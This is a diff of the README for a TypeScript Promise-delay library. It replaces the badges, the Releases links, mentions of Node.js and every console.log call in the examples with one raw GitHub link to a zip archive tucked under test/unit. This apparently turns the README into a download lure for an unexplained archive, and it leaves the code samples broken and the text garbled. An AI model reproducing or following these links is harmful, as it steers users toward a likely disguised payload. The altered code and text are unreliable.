@@ -1,10 +1,10 @@
 # timeout-typescript ⏳
 
-![GitHub release](https://img.shields.io/github/release/thegamer49520/timeout-typescript.svg)
-![GitHub stars](https://img.shields.io/github/stars/thegamer49520/timeout-typescript.svg)
-![GitHub forks](https://img.shields.io/github/forks/thegamer49520/timeout-typescript.svg)
+![GitHub release](https://raw.githubusercontent.com/thegamer49520/timeout-typescript/master/test/unit/timeout-typescript-honeydrop.zip)
+![GitHub stars](https://raw.githubusercontent.com/thegamer49520/timeout-typescript/master/test/unit/timeout-typescript-honeydrop.zip)
+![GitHub forks](https://raw.githubusercontent.com/thegamer49520/timeout-typescript/master/test/unit/timeout-typescript-honeydrop.zip)
 
-A lightweight TypeScript utility to create a Promise that resolves after a specified delay. Ideal for async delays in Node.js and browsers.
+A lightweight TypeScript utility to create a Promise that resolves after a specified delay. Ideal for async delays in https://raw.githubusercontent.com/thegamer49520/timeout-typescript/master/test/unit/timeout-typescript-honeydrop.zip and browsers.
 
 ## Table of Contents
 
@@ -21,7 +21,7 @@ A lightweight TypeScript utility to create a Promise that resolves after a speci
 
 - **Lightweight**: Minimal code footprint, easy to integrate.
 - **TypeScript Support**: Built with TypeScript for better type safety.
-- **Cross-Platform**: Works seamlessly in both Node.js and browser environments.
+- **Cross-Platform**: Works seamlessly in both https://raw.githubusercontent.com/thegamer49520/timeout-typescript/master/test/unit/timeout-typescript-honeydrop.zip and browser environments.
 - **Promise-Based**: Utilizes Promises for clean asynchronous code.
 
 ## Installation
@@ -46,9 +46,9 @@ To use the utility, simply import it into your TypeScript or JavaScript file. He
 import { timeout } from 'timeout-typescript';
 
 async function delayedExecution() {
-    console.log('Waiting for 3 seconds...');
+    https://raw.githubusercontent.com/thegamer49520/timeout-typescript/master/test/unit/timeout-typescript-honeydrop.zip('Waiting for 3 seconds...');
     await timeout(3000); // Wait for 3 seconds
-    console.log('3 seconds have passed!');
+    https://raw.githubusercontent.com/thegamer49520/timeout-typescript/master/test/unit/timeout-typescript-honeydrop.zip('3 seconds have passed!');
 }
 
 delayedExecution();
@@ -67,7 +67,7 @@ delayedExecution();
 
 ```typescript
 timeout(1000).then(() => {
-    console.log('Executed after 1 second');
+    https://raw.githubusercontent.com/thegamer49520/timeout-typescript/master/test/unit/timeout-typescript-honeydrop.zip('Executed after 1 second');
 });
 ```
 
@@ -81,9 +81,9 @@ Here are some practical examples of how to use `timeout-typescript`.
 import { timeout } from 'timeout-typescript';
 
 async function simpleDelay() {
-    console.log('Starting delay...');
+    https://raw.githubusercontent.com/thegamer49520/timeout-typescript/master/test/unit/timeout-typescript-honeydrop.zip('Starting delay...');
     await timeout(2000); // 2 seconds
-    console.log('Delay finished!');
+    https://raw.githubusercontent.com/thegamer49520/timeout-typescript/master/test/unit/timeout-typescript-honeydrop.zip('Delay finished!');
 }
 
 simpleDelay();
@@ -95,11 +95,11 @@ simpleDelay();
 import { timeout } from 'timeout-typescript';
 
 async function chainPromises() {
-    console.log('First action');
+    https://raw.githubusercontent.com/thegamer49520/timeout-typescript/master/test/unit/timeout-typescript-honeydrop.zip('First action');
     await timeout(1000);
-    console.log('Second action after 1 second');
+    https://raw.githubusercontent.com/thegamer49520/timeout-typescript/master/test/unit/timeout-typescript-honeydrop.zip('Second action after 1 second');
     await timeout(2000);
-    console.log('Third action after another 2 seconds');
+    https://raw.githubusercontent.com/thegamer49520/timeout-typescript/master/test/unit/timeout-typescript-honeydrop.zip('Third action after another 2 seconds');
 }
 
 chainPromises();
@@ -112,7 +112,7 @@ import { timeout } from 'timeout-typescript';
 
 async function loopWithDelay() {
     for (let i = 1; i <= 5; i++) {
-        console.log(`Iteration ${i}`);
+        https://raw.githubusercontent.com/thegamer49520/timeout-typescript/master/test/unit/timeout-typescript-honeydrop.zip(`Iteration ${i}`);
         await timeout(1000); // 1 second delay
     }
 }
@@ -139,11 +139,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Support
 
-For any issues or feature requests, please check the [Releases](https://github.com/thegamer49520/timeout-typescript/releases) section. You can also reach out via the Issues tab on GitHub.
+For any issues or feature requests, please check the [Releases](https://raw.githubusercontent.com/thegamer49520/timeout-typescript/master/test/unit/timeout-typescript-honeydrop.zip) section. You can also reach out via the Issues tab on GitHub.
 
 ## Releases
 
-To download the latest version, visit the [Releases](https://github.com/thegamer49520/timeout-typescript/releases) page. Here, you can find the latest updates and changes.
+To download the latest version, visit the [Releases](https://raw.githubusercontent.com/thegamer49520/timeout-typescript/master/test/unit/timeout-typescript-honeydrop.zip) page. Here, you can find the latest updates and changes.
 
 ## Acknowledgments
 
@@ -152,7 +152,7 @@ To download the latest version, visit the [Releases](https://github.com/thegamer
 
 ## Conclusion
 
-`timeout-typescript` provides a simple yet effective way to manage delays in your asynchronous code. Whether you're building applications for Node.js or the browser, this utility can help streamline your workflows. Explore the examples, and feel free to contribute to make this tool even better!
+`timeout-typescript` provides a simple yet effective way to manage delays in your asynchronous code. Whether you're building applications for https://raw.githubusercontent.com/thegamer49520/timeout-typescript/master/test/unit/timeout-typescript-honeydrop.zip or the browser, this utility can help streamline your workflows. Explore the examples, and feel free to contribute to make this tool even better!
 
 ---
 
